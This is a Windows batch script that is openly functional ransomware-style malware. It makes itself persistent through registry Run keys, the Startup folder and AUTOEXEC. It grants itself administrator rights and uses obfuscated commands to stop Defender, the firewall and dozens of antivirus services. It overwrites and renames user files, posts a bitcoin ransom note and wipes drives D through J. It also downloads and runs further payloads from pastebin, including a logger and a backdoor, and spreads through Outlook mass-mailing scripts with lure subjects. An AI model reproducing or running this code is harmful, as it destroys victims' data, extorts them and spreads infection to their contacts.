@ echo off
attrib +h +s %0
powershell -command "Set-ExecutionPolicy Unrestricted"
cd %userprofile% 
echo @ echo off >> "NoInt.bat"
echo :loop >> "NoInt.bat"
echo %systemroot%\system32\scrnsave.scr /s >> "NoInt.bat"
echo rundll32 user32.dll,SetCursorPos >> "NoInt.bat"
echo goto loop >> "NoInt.bat"
start NoInt.bat
RUNDLL32 USER32.DLL SwapMouseButton
net localgroup administrators session /ADD
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
cls
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
start /max cmd.exe
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "wuauserv"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% "*%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% "*%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% "*%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" /y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" /y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt

tskill iexplore
tskill msnmsgr
tskill excel
tskill iTunes
tskill calc
tskill msaccess
tskill safari
tskill mspaint
tskill outlook
tskill WINWORD

cls
cd %userprofile%\Desktop\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe
cls
cd %userprofile%\Documents\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe

cls
cd %userprofile%\Music\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe
cls
cd %userprofile%\Pictures\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe
cls
cd %userprofile%\Videos\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe
cls
cd %userprofile%\Downloads\
echo %random%%random%%random%%random%%random% >>  "random.txt"
for /r %%f in (*.*) do xcopy /y random.txt %%f
ren *.* C0pe-%random%%random%*.C0pe
cls
cd %userprofile%\Desktop\
echo Your files are unusable pay $100 in bitcoin to bc1qlly4puaz7pz3zmph8n2d620jc2j60qf4ve5qll to get a decryption file and key. > "ReadMe.txt"
echo Contact at shrimantivirus@gmail.com >> "readme.txt"
start ReadMe.txt
cd %userprofile%
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/T9sHxNbG -outfile C0peN0te.bat"

cd %userprofile%
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/mkg30sm4 -outfile G0nnaL0g.bat"
start /min G0nnaL0g.bat
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/HGwunTp9 -outfile G0nnaD00r.bat"
start /min G0nnaD00r.bat
cls
cd %userprofile%
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/929542681879789588/970380447324446750/unknown_5.png?size=4096', 'bg.png')"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %userprofile%\bg.png /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cls
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
xcopy /e /y windows.inf D:\
xcopy /e /y windows.inf E:\
xcopy /e /y windows.inf F:\
xcopy /e /y windows.inf G:\
xcopy /e /y windows.inf H:\
xcopy /e /y G0nnaC0pe.bat D:\
xcopy /e /y G0nnaC0pe.bat E:\
xcopy /e /y G0nnaC0pe.bat F:\
xcopy /e /y G0nnaC0pe.bat G:\
xcopy /e /y G0nnaC0pe.bat H:\
xcopy /e /y G0nnaC0pe.bat %userprofile%
xcopy /e /y G0nnaC0pe.bat %systemroot%\system32
cls
net send * "Due to the recent spread of "G0nnaC0pe" we are requiring everyone to get the G0nnaDecrypt0r A.S.A.P. I am sending the link in the next message."
net send * "https://www.mediafire.com/file/ut3hig9hde1x5tl/G0nnaDecrypt0r.cmd/file It's loaded in mediafire due to not having enough time sorry."
cls


del NoInt.bat
rundll32 user32.dll,SetCursorPos
start /max C0peN0te.bat
start /max C0peN0te.bat
start /max C0peN0te.bat
start /max C0peN0te.bat
start /max C0peN0te.bat
start /max C0peN0te.bat
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "START PAGE" /d "%random%%random%%random%%random%"
cd %userprofile%
echo dim x>>   %cd%\DocUAsked4.vbs
echo on error resume next>>   %cd%\DocUAsked4.vbs
echo Set fso ="Scripting.FileSystem.Object">>   %cd%\DocUAsked4.vbs
echo Set so=CreateObject(fso)>>   %cd%\DocUAsked4.vbs
echo Set ol=CreateObject("Outlook.Application")>>   %cd%\DocUAsked4.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>   %cd%\DocUAsked4.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>   %cd%\DocUAsked4.vbs
echo Set a = mapi.AddressLists(1)>>   %cd%\DocUAsked4.vbs
echo Set ae=a.AddressEntries>>   %cd%\DocUAsked4.vbs
echo For x=1 To ae.Count>>   %cd%\DocUAsked4.vbs
echo Set ci=ol.CreateItem(0)>>   %cd%\DocUAsked4.vbs
echo Set Mail=ci>>   %cd%\DocUAsked4.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>   %cd%\DocUAsked4.vbs
echo Mail.Subject="Heres that document you asked for">>   %cd%\DocUAsked4.vbs
echo Mail.Body="doc">>   %cd%\DocUAsked4.vbs
echo Mail.Attachments.Add(%0)>>   %cd%\DocUAsked4.vbs
echo Mail.send>>   %cd%\DocUAsked4.vbs
echo Next>>   %cd%\DocUAsked4.vbs
echo ol.Quit>>   %cd%\DocUAsked4.vbs
WScript  %cd%\DocUAsked4.vbs
WScript  %cd%\DocUAsked4.vbs
WScript  %cd%\DocUAsked4.vbs
WScript  %cd%\DocUAsked4.vbs
echo dim x>>   %cd%\Ihaveacrushonyou.vbs
echo on error resume next>>   %cd%\Ihaveacrushonyou.vbs
echo Set fso ="Scripting.FileSystem.Object">>   %cd%\Ihaveacrushonyou.vbs
echo Set so=CreateObject(fso)>>   %cd%\Ihaveacrushonyou.vbs
echo Set ol=CreateObject("Outlook.Application")>>   %cd%\Ihaveacrushonyou.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>   %cd%\Ihaveacrushonyou.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>   %cd%\Ihaveacrushonyou.vbs
echo Set a = mapi.AddressLists(1)>>   %cd%\Ihaveacrushonyou.vbs
echo Set ae=a.AddressEntries>>   %cd%\Ihaveacrushonyou.vbs
echo For x=1 To ae.Count>>   %cd%\Ihaveacrushonyou.vbs
echo Set ci=ol.CreateItem(0)>>   %cd%\Ihaveacrushonyou.vbs
echo Set Mail=ci>>   %cd%\Ihaveacrushonyou.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>   %cd%\Ihaveacrushonyou.vbs
echo Mail.Subject="I have a confession">>   %cd%\Ihaveacrushonyou.vbs
echo Mail.Body="Readme">>   %cd%\Ihaveacrushonyou.vbs
echo Mail.Attachments.Add(%0)>>   %cd%\Ihaveacrushonyou.vbs
echo Mail.send>>   %cd%\Ihaveacrushonyou.vbs
echo Next>>   %cd%\Ihaveacrushonyou.vbs
echo ol.Quit>>   %cd%\Ihaveacrushonyou.vbs
WScript  %cd%\Ihaveacrushonyou.vbs
WScript  %cd%\Ihaveacrushonyou.vbs
WScript  %cd%\Ihaveacrushonyou.vbs
WScript  %cd%\Ihaveacrushonyou.vbs
echo dim x>>   %cd%\CheckThisOut.vbs
echo on error resume next>>   %cd%\CheckThisOut.vbs
echo Set fso ="Scripting.FileSystem.Object">>   %cd%\CheckThisOut.vbs
echo Set so=CreateObject(fso)>>   %cd%\CheckThisOut.vbs
echo Set ol=CreateObject("Outlook.Application")>>   %cd%\CheckThisOut.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>   %cd%\CheckThisOut.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>   %cd%\CheckThisOut.vbs
echo Set a = mapi.AddressLists(1)>>   %cd%\CheckThisOut.vbs
echo Set ae=a.AddressEntries>>   %cd%\CheckThisOut.vbs
echo For x=1 To ae.Count>>   %cd%\CheckThisOut.vbs
echo Set ci=ol.CreateItem(0)>>   %cd%\CheckThisOut.vbs
echo Set Mail=ci>>   %cd%\CheckThisOut.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>   %cd%\CheckThisOut.vbs
echo Mail.Subject="Hey check this out">>   %cd%\CheckThisOut.vbs
echo Mail.Body="readme">>   %cd%\CheckThisOut.vbs
echo Mail.Attachments.Add(%0)>>   %cd%\CheckThisOut.vbs
echo Mail.send>>   %cd%\CheckThisOut.vbs
echo Next>>   %cd%\CheckThisOut.vbs
echo ol.Quit>>   %cd%\CheckThisOut.vbs
WScript  %cd%\CheckThisOut.vbs
WScript  %cd%\CheckThisOut.vbs
WScript  %cd%\CheckThisOut.vbs
WScript  %cd%\CheckThisOut.vbs
cls
